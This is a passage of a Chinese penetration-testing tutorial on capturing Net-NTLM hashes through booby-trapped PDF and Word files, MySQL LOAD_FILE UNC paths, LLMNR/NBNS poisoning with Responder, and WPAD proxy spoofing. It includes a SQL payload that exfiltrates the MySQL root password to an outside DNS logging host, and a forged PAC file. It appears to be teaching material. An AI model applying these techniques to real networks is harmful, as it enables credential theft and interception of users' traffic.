+<p>PDF&#x89C4;&#x8303;&#x5141;&#x8BB8;&#x4E3A;GoTobe&#x548C;GoToR&#x6761;&#x76EE;&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;&#x5185;&#x5BB9;&#x3002;PDF&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x4E00;&#x9879;&#x529F;&#x80FD;&#xFF0C;&#x8BF7;&#x6C42;&#x8FDC;&#x7A0B;SMB&#x670D;&#x52A1;&#x5668;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E09;&#x597D;&#x5B66;&#x751F;&#x7684;&#x811A;&#x672C;<a href="https://github.com/3gstudent/Worse-PDF" target="_blank">https://github.com/3gstudent/Worse-PDF</a></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121175034419.png" alt="image-20191121175034419"></p>
+<p>&#x6211;&#x4EEC;&#x5C31;&#x6536;&#x5230;net-ntlm  hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121175116135.png" alt="image-20191121175116135"></p>
+<p>&#x7528;&#x6237;&#x4F7F;&#x7528;PDF&#x9605;&#x8BFB;&#x5668;&#x6253;&#x5F00;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;IE&#x6216;&#x662F;Chrome&#x6253;&#x5F00;PDF&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x3002;</p>
+<p>&#x5728;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x4E2D;&#x4F7F;&#x7528;Adobe</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121175715381.png" alt="image-20191121175715381"></p>
+<p>&#x53D1;&#x73B0;&#x4F1A;&#x6709;&#x63D0;&#x793A;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121175838786.png" alt="image-20191121175838786"></p>
+<h2 id="0x06-office">0x06 office</h2>
+<p>&#x9996;&#x5148;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;word&#xFF0C;&#x8D34;&#x8FD1;&#x4E00;&#x5F20;&#x56FE;&#x7247;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121182534202.png" alt="image-20191121182534202"></p>
+<p>&#x7136;&#x540E;&#x7528;7zip &#x6253;&#x5F00;(&#x6CA1;&#x6D4B;&#x8BD5;&#x5176;&#x4ED6;&#x8F6F;&#x4EF6;&#xFF0C;&#x53EF;&#x81EA;&#x884C;&#x6D4B;&#x8BD5;)</p>
+<p>&#x8FDB;&#x5165;word\_rels&#xFF0C;&#x4FEE;&#x6539;document.xml.rels</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121182941462.png" alt="image-20191121182941462"></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;Target&#x53C2;&#x6570;&#x672C;&#x6765;&#x662F;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121182705648.png" alt="image-20191121182705648"></p>
+<p>&#x4FEE;&#x6539;&#x4E3A;UNC&#x8DEF;&#x5F84;&#xFF0C;&#x7136;&#x540E;&#x52A0;&#x4E0A;<code>TargetMode=&quot;External&quot;</code></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121183030427.png" alt="image-20191121183030427"></p>
+<p>&#x5F53;&#x6253;&#x5F00;word&#x7684;&#x65F6;&#x5019;,&#x6211;&#x4EEC;&#x5C31;&#x62FF;&#x5230;net-ntlm  hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121183321169.png" alt="image-20191121183321169"></p>
+<h2 id="0x07-mysql">0x07 MySQL</h2>
+<p>&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5728;MySQL&#x6CE8;&#x5165;&#x7684;&#x8BDD;&#xFF0C;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5E26;&#x5916;&#x901A;&#x4FE1;&#x628A;&#x6570;&#x636E;&#x5E26;&#x51FA;&#x6765;&#x3002;&#x8BED;&#x6CD5;&#x5982;&#x4E0B;&#x3002;</p>
+<pre><code class="lang-mysql">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.mysql.ip.port.b182oj.ceye.io\\abc&apos;));
+</code></pre>
+<p>&#x9700;&#x8981;&#x5177;&#x5907;load_file&#x6743;&#x9650;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;secure_file_priv&#x7684;&#x9650;&#x5236;(5.5.53&#x9ED8;&#x8BA4;&#x662F;&#x7A7A;&#xFF0C;&#x4E4B;&#x540E;&#x7684;&#x8BDD;&#x9ED8;&#x8BA4;&#x4E3A;NULL&#x5C31;&#x4E0D;&#x597D;&#x5229;&#x7528;&#x4E86;,&#x4E0D;&#x6392;&#x9664;&#x4E00;&#x4E9B;&#x7BA1;&#x7406;&#x5458;&#x4F1A;&#x6539;)</p>
+<p>&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x6211;&#x4EEC;&#x4F1A;&#x53D1;&#x73B0;LOAD_FILE&#x662F;&#x652F;&#x6301;UNC&#x8DEF;&#x52B2;</p>
+<p>&#x6211;&#x4EEC;&#x6784;&#x9020;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">&apos;\\\\172.16.100.1\\mysql&apos;</span>);
+</code></pre>
+<p>&#x62FF;&#x5230;net-ntlm  hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120203418305.png" alt="image-20191120203418305"></p>
+<h2 id="0x08-nbns&#x548C;llmnr">0x08 NBNS&#x548C;LLMNR</h2>
+<p>windows &#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x987A;&#x5E8F;&#x662F;</p>
+<ul>
+<li>Hosts</li>
+<li>DNS (cache / server) </li>
+<li>LLMNR</li>
+<li>NBNS </li>
+</ul>
+<p>&#x5982;&#x679C;Hosts&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;DNS&#x89E3;&#x6790;&#x3002;&#x5982;&#x679C;DNS&#x89E3;&#x6790;&#x5931;&#x8D25;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;LLMNR&#x89E3;&#x6790;&#xFF0C;&#x5982;&#x679C;LLMNR&#x89E3;&#x6790;&#x5931;&#x8D25;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;NBNS&#x89E3;&#x6790;</p>
+<h3 id="1-llmnr">1. LLMNR</h3>
+<p>LLMNR &#x662F;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x534F;&#x8BAE;&#x57DF;&#x540D;&#x7CFB;&#x7EDF;&#xFF08;DNS&#xFF09;&#x6570;&#x636E;&#x5305;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F97;&#x4E24;&#x8005;&#x7684;IPv4&#x548C;IPv6&#x7684;&#x4E3B;&#x673A;&#x8FDB;&#x884C;&#x540D;&#x79F0;&#x89E3;&#x6790;&#x4E3A;&#x540C;&#x4E00;&#x672C;&#x5730;&#x94FE;&#x8DEF;&#x4E0A;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x56E0;&#x6B64;&#x4E5F;&#x79F0;&#x4F5C;&#x591A;&#x64AD; DNS&#x3002;&#x76D1;&#x542C;&#x7684;&#x7AEF;&#x53E3;&#x4E3A; UDP/5355&#xFF0C;&#x652F;&#x6301; IP v4 &#x548C; IP v6 &#xFF0C;&#x5E76;&#x4E14;&#x5728; Linux &#x4E0A;&#x4E5F;&#x5B9E;&#x73B0;&#x4E86;&#x6B64;&#x534F;&#x8BAE;&#x3002;&#x5176;&#x89E3;&#x6790;&#x540D;&#x79F0;&#x7684;&#x7279;&#x70B9;&#x4E3A;&#x7AEF;&#x5230;&#x7AEF;&#xFF0C;IPv4 &#x7684;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x4E3A; 224.0.0.252&#xFF0C;IPv6 &#x7684;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x4E3A; FF02:0:0:0:0:0:1:3 &#x6216; FF02::1:3&#x3002;</p>
+<p>LLMNR &#x8FDB;&#x884C;&#x540D;&#x79F0;&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x4E3A;&#xFF1A;</p>
+<ul>
+<li>&#x68C0;&#x67E5;&#x672C;&#x5730; NetBIOS &#x7F13;&#x5B58;</li>
+<li>&#x5982;&#x679C;&#x7F13;&#x5B58;&#x4E2D;&#x6CA1;&#x6709;&#x5219;&#x4F1A;&#x50CF;&#x5F53;&#x524D;&#x5B50;&#x7F51;&#x57DF;&#x53D1;&#x9001;&#x5E7F;&#x64AD;</li>
+<li>&#x5F53;&#x524D;&#x5B50;&#x7F51;&#x57DF;&#x7684;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x6536;&#x5230;&#x5E76;&#x68C0;&#x67E5;&#x5E7F;&#x64AD;&#x5305;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x4E3B;&#x673A;&#x54CD;&#x5E94;&#x5219;&#x8BF7;&#x6C42;&#x5931;&#x8D25;</li>
+</ul>
+<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;LLMNR&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x91C7;&#x7528;&#x5E7F;&#x64AD;&#x5305;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x53BB;&#x8BE2;&#x95EE;DNS&#xFF0C;&#x8DDF;ARP&#x5F88;&#x50CF;&#xFF0C;&#x90A3;&#x8DDF;ARP&#x6295;&#x6BD2;&#x4E00;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x3002;</p>
+<p>&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x57DF;&#x540D;&#x7684;&#x65F6;&#x5019;&#x3002;&#x6BD4;&#x5982; hhhhhhhhhhhhhhhhhhhh</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122155114548.png" alt="image-20191122155114548"></p>
+<p>&#x53D7;&#x5BB3;&#x8005;&#x5728;Hosts &#x6587;&#x4EF6;&#x91CC;&#x9762;&#x6CA1;&#x6709;&#x627E;&#x5230;&#xFF0C;&#x901A;&#x8FC7;DNS&#x89E3;&#x6790;&#x5931;&#x8D25;&#x3002;&#x5C31;&#x4F1A;&#x901A;&#x8FC7;LLMNR&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x5E7F;&#x64AD;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122145347129.png" alt="image-20191122145347129"></p>
+<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53D1;&#x4E2A;&#x54CD;&#x5E94;&#x5305; hhhhhhhhhhhhhhhhhhhh&#x5BF9;&#x5E94;&#x7684;IP&#x662F;x.x.x.x(&#x8FD9;&#x4E2A;ip&#x662F;&#x653B;&#x51FB;&#x8005;IP)&#x8FDB;&#x884C;LLMNR&#x6295;&#x6BD2;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124171717500.png" alt="image-20191124171717500"></p>
+<p>&#x8FD9;&#x4E00;&#x6B65;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Responder &#x5B9E;&#x73B0;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122153515913.png" alt="image-20191122153515913"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122152250157.png" alt="image-20191122152250157"></p>
+<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;hhhhhhhhhhhhhhhhhhhh&#x6620;&#x5C04;&#x7684;ip&#x5C31;&#x662F;&#x653B;&#x51FB;&#x8005;&#x7684;IP&#xFF0C;&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x8BBF;&#x95EE;hhhhhhhhhhhhhhhhhhhh&#x5C31;&#x4F1A;&#x8BBF;&#x95EE;&#x653B;&#x51FB;&#x8005;&#x7684;IP&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x80FD;&#x62FF;&#x5230;net-ntlm hash.</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122152020668.png" alt="image-20191122152020668"></p>
+<h3 id="2-nbns">2. NBNS</h3>
+<p>&#x5168;&#x79F0;&#x662F;NetBIOS Name Service&#x3002;</p>
+<p>NetBIOS &#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x540D;&#x79F0;&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ul>
+<li>&#x68C0;&#x67E5;&#x672C;&#x5730; NetBIOS &#x7F13;&#x5B58;</li>
+<li>&#x5982;&#x679C;&#x7F13;&#x5B58;&#x4E2D;&#x6CA1;&#x6709;&#x8BF7;&#x6C42;&#x7684;&#x540D;&#x79F0;&#x4E14;&#x5DF2;&#x914D;&#x7F6E;&#x4E86; WINS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5219;&#x4F1A;&#x5411; WINS &#x670D;&#x52A1;&#x5668;&#x53D1;&#x51FA;&#x8BF7;&#x6C42;</li>
+<li>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x914D;&#x7F6E; WINS &#x670D;&#x52A1;&#x5668;&#x6216; WINS &#x670D;&#x52A1;&#x5668;&#x65E0;&#x54CD;&#x5E94;&#x5219;&#x4F1A;&#x5411;&#x5F53;&#x524D;&#x5B50;&#x7F51;&#x57DF;&#x53D1;&#x9001;&#x5E7F;&#x64AD;</li>
+<li>&#x5982;&#x679C;&#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x540E;&#x65E0;&#x4EFB;&#x4F55;&#x4E3B;&#x673A;&#x54CD;&#x5E94;&#x5219;&#x4F1A;&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x7684; lmhosts &#x6587;&#x4EF6;</li>
+</ul>
+<p>lmhosts &#x6587;&#x4EF6;&#x4F4D;&#x4E8E;<code>C:\Windows\System32\drivers\etc\</code>&#x76EE;&#x5F55;&#x4E2D;&#x3002;</p>
+<p> NetBIOS &#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x540D;&#x79F0;&#x89E3;&#x6790;&#x662F;&#x53D1;&#x9001;&#x7684; UDP &#x5E7F;&#x64AD;&#x5305;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x6CA1;&#x6709;&#x914D;&#x7F6E; WINS &#x670D;&#x52A1;&#x5668;&#x7684;&#x60C5;&#x51B5;&#x5E95;&#x4E0B;&#xFF0C;LLMNR&#x534F;&#x8BAE;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF0C;&#x5728;NBNS&#x534F;&#x8BAE;&#x91CC;&#x9762;&#x540C;&#x65F6;&#x5B58;&#x5728;&#x3002;&#x4F7F;&#x7528;Responder&#x4E5F;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5F97;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x3002;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x91CD;&#x590D;&#x5C55;&#x793A;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122154208850.png" alt="image-20191122154208850"></p>
+<h2 id="0x09-wpad&#x548C;mitm6">0x09 WPAD&#x548C;mitm6</h2>
+<p>wpad &#x5168;&#x79F0;&#x662F;Web Proxy Auto-Discovery Protocol &#xFF0C;&#x901A;&#x8FC7;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5B9A;&#x4F4D;&#x4EE3;&#x7406;&#x914D;&#x7F6E;&#x6587;&#x4EF6;PAC(&#x5728;&#x4E0B;&#x6587;&#x4E5F;&#x53EB;&#x505A;PAC&#x6587;&#x4EF6;&#x6216;&#x8005;wpad.dat)&#xFF0C;&#x4E0B;&#x8F7D;&#x7F16;&#x8BD1;&#x5E76;&#x8FD0;&#x884C;&#xFF0C;&#x6700;&#x7EC8;&#x81EA;&#x52A8;&#x4F7F;&#x7528;&#x4EE3;&#x7406;&#x8BBF;&#x95EE;&#x7F51;&#x7EDC;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120181542550.png" alt="image-20191120181542550"></p>
+<p>&#x9ED8;&#x8BA4;&#x81EA;&#x52A8;&#x68C0;&#x6D4B;&#x8BBE;&#x7F6E;&#x662F;&#x5F00;&#x542F;&#x7684;&#x3002;</p>
+<p>PAC&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x5982;&#x4E0B;</p>
+<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FindProxyForURL</span>(<span class="hljs-params">url, host</span>) </span>{
+   <span class="hljs-keyword">if</span> (url== <span class="hljs-string">&apos;http://www.baidu.com/&apos;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;DIRECT&apos;</span>;
+   <span class="hljs-keyword">if</span> (host== <span class="hljs-string">&apos;twitter.com&apos;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;SOCKS 127.0.0.10:7070&apos;</span>;
+   <span class="hljs-keyword">if</span> (dnsResolve(host) == <span class="hljs-string">&apos;10.0.0.100&apos;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;PROXY 127.0.0.1:8086;DIRECT&apos;</span>;
+   <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;DIRECT&apos;</span>;
+}
+</code></pre>
+<p>WPAD&#x7684;&#x4E00;&#x822C;&#x8BF7;&#x6C42;&#x6D41;&#x7A0B;&#x662F;(&#x56FE;&#x7247;&#x6765;&#x6E90;&#x4E4C;&#x4E91;drop)</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122135217303.png" alt="image-20191122135217303"></p>
+<p>&#x7528;&#x6237;&#x5728;&#x8BBF;&#x95EE;&#x7F51;&#x9875;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x4F1A;&#x67E5;&#x8BE2;PAC&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x83B7;&#x53D6;PAC&#x6587;&#x4EF6;&#xFF0C;&#x5C06;PAC&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x4EE3;&#x7406;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x67E5;&#x8BE2;PAC&#x6587;&#x4EF6;&#x7684;&#x987A;&#x5E8F;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ol>
+<li><p>&#x901A;&#x8FC7;DHCP&#x670D;&#x52A1;&#x5668;</p>
+</li>
+<li><p>&#x67E5;&#x8BE2;WPAD&#x4E3B;&#x673A;&#x7684;IP</p>
+<ul>
+<li>Hosts</li>
+<li>DNS (cache / server) </li>
+<li>LLMNR</li>
+<li>NBNS </li>
+</ul>
+<p>&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x5C31;&#x6D89;&#x53CA;&#x5230;&#x4E24;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;</p>
+</li>
+</ol>
+<h3 id="1-&#x914D;&#x5408;llmnrnbns&#x6295;&#x6BD2;">1. &#x914D;&#x5408;LLMNR/NBNS&#x6295;&#x6BD2;</h3>
+<p>   &#x8FD9;&#x662F;&#x6700;&#x65E9;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3002;&#x7528;&#x6237;&#x5728;&#x8BBF;&#x95EE;&#x7F51;&#x9875;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x4F1A;&#x67E5;&#x8BE2;PAC&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#x67E5;&#x8BE2;&#x7684;&#x5730;&#x5740;&#x662F;WPAD/wpad.dat&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5728;&#x57DF;&#x5185;&#x4E13;&#x95E8;&#x914D;&#x7F6E;&#x8FD9;&#x4E2A;&#x57DF;&#x540D;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;DNS&#x89E3;&#x6790;&#x5931;&#x8D25;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;LLMNR&#x53D1;&#x8D77;&#x5E7F;&#x64AD;&#x5305;&#x8BE2;&#x95EE;WPAD&#x5BF9;&#x5E94;&#x7684;ip&#x662F;&#x591A;&#x5C11;,&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;LLMNR&#x6295;&#x6BD2;&#x548C;NBNS&#x6295;&#x6BD2;&#x3002;Responder&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5F97;&#x5B9E;&#x73B0;&#x3002;</p>
+<ol>
+<li><p>&#x53D7;&#x5BB3;&#x8005;&#x901A;&#x8FC7;llmnr&#x8BE2;&#x95EE;wpad&#x4E3B;&#x673A;&#x5728;&#x54EA;&#x91CC;&#xFF0C;Responder&#x901A;&#x8FC7;llmnr&#x6295;&#x6BD2;&#x5C06;wpad&#x7684;ip&#x6307;&#x5411;Responder&#x6240;&#x5728;&#x7684;&#x670D;&#x52A1;&#x5668;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124175110516.png" alt="image-20191124175110516"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124174231397.png" alt="image-20191124174231397"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124175318139.png" alt="image-20191124175318139"></p>
+</li>
+<li><p>&#x53D7;&#x5BB3;&#x8005;&#x8BBF;&#x95EE;WPAD/wpad.dat&#xFF0C;Responder&#x5C31;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;&#x7684;net-ntlm hash(&#x8FD9;&#x4E2A;Responder&#x9ED8;&#x8BA4;&#x4E0D;&#x5F00;&#xFF0C;&#x56E0;&#x4E3A;&#x5BB3;&#x6015;&#x4F1A;&#x6709;&#x767B;&#x5F55;&#x63D0;&#x9192;&#xFF0C;&#x4E0D;&#x5229;&#x4E8E;&#x540E;&#x9762;&#x7684;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#xFF0C;&#x53EF;&#x4EE5;&#x52A0;&#x4E0A;<code>-F</code> &#x5F00;&#x542F;)</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124183449298.png" alt="image-20191124183449298"></p>
+<p>&#x7136;&#x540E;Responder&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x5982;&#x4E0B;pac&#x6587;&#x4EF6;&#x5C06;&#x4EE3;&#x7406;&#x6307;&#x5411; ISAProxySrv:3141&#x3002;</p>
+<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FindProxyForURL</span>(<span class="hljs-params">url, host</span>)</span>{
+  <span class="hljs-keyword">if</span> ((host == <span class="hljs-string">&quot;localhost&quot;</span>) 
+      || shExpMatch(host, <span class="hljs-string">&quot;localhost.*&quot;</span>) 
+      ||(host == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) 
+      || isPlainHostName(host)) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECT&quot;</span>; 
+  <span class="hljs-keyword">if</span> (dnsDomainIs(host, <span class="hljs-string">&quot;RespProxySrv&quot;</span>)
+      ||shExpMatch(host, <span class="hljs-string">&quot;(*.RespProxySrv|RespProxySrv)&quot;</span>)) 
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECT&quot;</span>; 
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;PROXY ISAProxySrv:3141; DIRECT&apos;</span>;}
+</code></pre>
+</li>
+<li><p>&#x53D7;&#x5BB3;&#x8005;&#x4F1A;&#x4F7F;&#x7528;ISAProxySrv:3141&#x4F5C;&#x4E3A;&#x4EE3;&#x7406;&#xFF0C;&#x4F46;&#x662F;&#x53D7;&#x5BB3;&#x8005;&#x4E0D;&#x77E5;&#x9053;ISAProxySrv&#x5BF9;&#x5E94;&#x7684;ip&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x518D;&#x6B21;&#x67E5;&#x8BE2;&#xFF0C;Responder&#x518D;&#x6B21;&#x901A;&#x8FC7;llmnr&#x6295;&#x6BD2;&#x8FDB;&#x884C;&#x6B3A;&#x9A97;&#x3002;&#x5C06;ISAProxySrv&#x6307;&#x5411;Responder&#x672C;&#x8EAB;&#x3002;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x505A;&#x7684;&#x4E8B;&#x5C31;&#x5F88;&#x591A;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x63D2;&#x5165;xss payload&#x83B7;&#x53D6;net-ntlm hash&#xFF0C;&#x4E2D;&#x95F4;&#x4EBA;&#x83B7;&#x53D6;post&#xFF0C;cookie&#x7B49;&#x53C2;&#x6570;&#xFF0C;&#x901A;&#x8FC7;basic&#x8BA4;&#x8BC1;&#x8FDB;&#x884C;&#x9493;&#x9C7C;&#xFF0C;&#x8BF1;&#x5BFC;&#x4E0B;&#x8F7D;exe&#x7B49;&#x7B49;&#xFF0C;Responder&#x90FD;&#x652F;&#x6301;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x7EC6;&#x5C55;&#x5F00;&#x4E86;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124181733734.png" alt="image-20191124181733734"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124182108718.png" alt="image-20191124182108718"></p>
+</li>
+</ol>
+<p>   <img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124182302716.png" alt="image-20191124182302716"></p>
+<p>   <img src="img/NTLM_RELAY_1_ANQUANKE/image-20191124182826186.png" alt="image-20191124182826186"></p>
+<p>   &#x7136;&#x800C;&#xFF0C;&#x5FAE;&#x8F6F;&#x5728;2016&#x5E74;&#x53D1;&#x5E03;&#x4E86;<a href="https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016" target="_blank">MS16-077</a>&#x5B89;&#x5168;&#x516C;&#x544A;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#xFF0C;&#x4EE5;&#x7F13;&#x89E3;&#x8FD9;&#x7C7B;&#x653B;&#x51FB;&#x884C;&#x4E3A;&#xFF1A;</p>
+<p>   1&#x3001;&#x7CFB;&#x7EDF;&#x518D;&#x4E5F;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x5E7F;&#x64AD;&#x534F;&#x8BAE;&#x6765;&#x89E3;&#x6790;WPAD&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x4F7F;&#x7528;DHCP&#x6216;DNS&#x534F;&#x8BAE;&#x5B8C;&#x6210;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;</p>
+<p>   2&#x3001;&#x66F4;&#x6539;&#x4E86;PAC&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x7684;&#x9ED8;&#x8BA4;&#x884C;&#x4E3A;&#xFF0C;&#x4EE5;&#x4FBF;&#x5F53;WinHTTP&#x8BF7;&#x6C42;PAC&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x51ED;&#x636E;&#x6765;&#x54CD;&#x5E94;NTLM&#x6216;&#x534F;&#x5546;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8D28;&#x8BE2;&#x3002;</p>
+<h3 id="2-&#x914D;&#x5408;dhcpv6">2. &#x914D;&#x5408;DHCPv6</h3>
